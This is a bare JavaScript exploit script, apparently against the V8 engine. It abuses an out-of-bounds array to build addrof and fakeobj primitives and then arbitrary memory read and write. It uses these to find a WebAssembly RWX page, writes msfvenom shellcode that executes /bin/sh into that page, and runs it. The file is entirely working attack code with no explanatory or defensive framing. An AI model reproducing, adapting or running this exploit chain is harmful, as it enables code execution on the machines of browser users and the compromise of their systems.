var bytes = new ArrayBuffer(8);
var floats = new Float64Array(bytes);
var uints = new BigUint64Array(bytes);

function float_to_uint(val) {
  floats[0] = val;
  return uints[0];
}

function uint_to_float(val) {
  uints[0] = val;
  return floats[0];
}

var oob_arr = [1.1];
var f64_arr = [1.1];
var tmp_obj = {a: 1};
var obj_arr = [tmp_obj];

for (let i = 0; i < 999; ++i) {
  oob_arr.concat([undefined]);
}
console.assert(oob_arr.length == 1000);

var f64_map = float_to_uint(oob_arr[5]) & 0xffffffffn;
var obj_map = float_to_uint(oob_arr[14]) & 0xffffffffn;

function addrof(obj) {
  obj_arr[0] = obj;
  properties = float_to_uint(oob_arr[14]) >> 32n;
  oob_arr[14] = uint_to_float((properties << 32n) + f64_map);

  var ptr = float_to_uint(obj_arr[0]) & 0xffffffffn;
  oob_arr[14] = uint_to_float((properties << 32n) + obj_map);
  return ptr - 1n;
}

function fakeobj(ptr) {
  f64_arr[0] = uint_to_float(ptr + 1n);
  properties = float_to_uint(oob_arr[5]) >> 32n;
  oob_arr[5] = uint_to_float((properties << 32n) + obj_map);

  var obj = f64_arr[0];
  oob_arr[5] = uint_to_float((properties << 32n) + f64_map);
  return obj;
}

var rdw_arr = [1.1, 2.2];

function arb_read(ptr) {
  rdw_arr[0] = uint_to_float(f64_map);
  var obj = fakeobj(addrof(rdw_arr) + 0x20n);

  rdw_arr[1] = uint_to_float((1n << 33n) + ptr - 8n + 1n);
  return float_to_uint(obj[0]);
}

function arb_write(ptr, val) {
  rdw_arr[0] = uint_to_float(f64_map);
  var obj = fakeobj(addrof(rdw_arr) + 0x20n);

  rdw_arr[1] = uint_to_float((1n << 33n) + ptr - 8n + 1n);
  obj[0] = uint_to_float(val);
}

function write_data(ptr, data) {
  var buf = new ArrayBuffer(data.length);
  var view = new DataView(buf);

  var store = addrof(buf) + 0x1cn;
  arb_write(store, ptr);

  for (let i = 0; i < data.length; ++i) {
    view.setUint8(i, data[i]);
  }
}

var wasm_code = new Uint8Array([
  0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,
  0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,
  0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
  10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11
]);

var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_entry = wasm_instance.exports.main;

var rwx_page = arb_read(addrof(wasm_instance) + 0x68n);

// msfvenom -p linux/x64/exec CMD="/bin/sh" -f csharp
var shellcode = new Uint8Array([
  0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,
  0x66,0x68,0x2d,0x63,0x54,0x5e,0x52,0xe8,0x08,0x00,0x00,0x00,0x2f,0x62,0x69,
  0x6e,0x2f,0x73,0x68,0x00,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
]);

write_data(rwx_page, shellcode);
wasm_entry();

